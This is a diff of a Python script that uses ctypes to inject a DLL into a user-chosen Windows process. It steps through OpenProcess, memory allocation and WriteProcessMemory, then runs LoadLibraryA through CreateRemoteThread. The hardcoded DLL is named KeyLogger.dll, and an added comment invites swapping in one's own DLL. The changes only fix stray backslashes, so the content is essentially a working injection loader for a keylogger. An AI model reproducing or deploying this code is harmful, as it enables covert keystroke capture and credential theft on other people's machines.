@@ -6,14 +6,14 @@ import time
 import wmi
 import sys
 
-### Global Variables\
+### Global Variables
 ### These are just static values defined my windows for memory operations
 ### More information available @ Windows -> Memory Protection Constraints
 PROCESS_ALL_ACCESS = 0x1F0FFF # This is the value for the permission level we need to open and write to a process
 RESERVE_MEMORY = 0x00002000 # Our DLL needs space in memory, as such, we reserve it
 COMMIT_MEMORY = 0x00001000 # Commit the reserved memory so that we can use it
 PAGE_READWRITE = 0x04 #Since we arent executing shellcode, this only needs to be Read/Write -> shellcode injection would be PAGE_EXECUTE_READWRITE (0x40)
-\
+
 ### Process Injection Workflow
 ### 1 - Identify a process to inject into (prompt user for this)
 ### 2 - Get a handle to the process
@@ -22,6 +22,7 @@ PAGE_READWRITE = 0x04 #Since we arent executing shellcode, this only needs to be
 ### 5 - Call the new dll using load library
 
 ### Define the path to the DLL (keeping this static for ease)
+## Just change this to your own DLL
 dll_path = dll_path = "C:\\Users\\Sam\\source\\repos\\KeyLogger\\Release\\KeyLogger.dll"
 
 
@@ -29,7 +30,7 @@ dll_path = dll_path = "C:\\Users\\Sam\\source\\repos\\KeyLogger\\Release\\KeyLog
 pid = int(input("Enter a 32bit Process ID: "))
 
 ### Step 2 - Get a handle to the process
-handle_to_process = ctypes.windll.kernel32.OpenProcess(PROCESS_ALL_ACCESS, False, pid)\
+handle_to_process = ctypes.windll.kernel32.OpenProcess(PROCESS_ALL_ACCESS, False, pid)
 print("\n[DEBUGGING] The value for handle_process_is:", handle_to_process)
 time.sleep(1)
 if not handle_to_process:
@@ -51,13 +52,13 @@ if not created_memory:
 write_bytes = ctypes.c_size_t(0)
 if not ctypes.windll.kernel32.WriteProcessMemory(handle_to_process, created_memory, dll_path_bytes, len(dll_path_bytes), ctypes.byref(write_bytes)):
     print("Something went wrong writing the DLL into the memory... Troubleshoot here")
-    sys.exit(1)\
+    sys.exit(1)
 ### Step 5 - use load library to create a remote thread to call loadlibrary on our DLL
 ## To call the LoadLibrary Module, we need to first get a handle to it
 kernel32_handle = ctypes.windll.kernel32.GetModuleHandleA(b"Kernel32.dll")
 load_library_handle = ctypes.windll.kernel32.GetProcAddress(kernel32_handle, b"LoadLibraryA")
 if not load_library_handle:
-    print("Couldnt get a handle to LoadLibary... Exiting")\
+    print("Couldnt get a handle to LoadLibary... Exiting")
     sys.exit(1)
 
 ### Step 6 - Use CreateRemoteThread to start a remote thread within the target process
@@ -70,9 +71,9 @@ if not handle_thread:
     sys.exit(1)
 
 
-print("\\nDLL Successfully injected into target pid!!")
-print("You can check for this in process hacker\\n")
-time.sleep(1)\
+print("\nDLL Successfully injected into target pid!!")
+print("You can check for this in process hacker\n")
+time.sleep(1)
 print("You can safely close this script window :)")
 
 
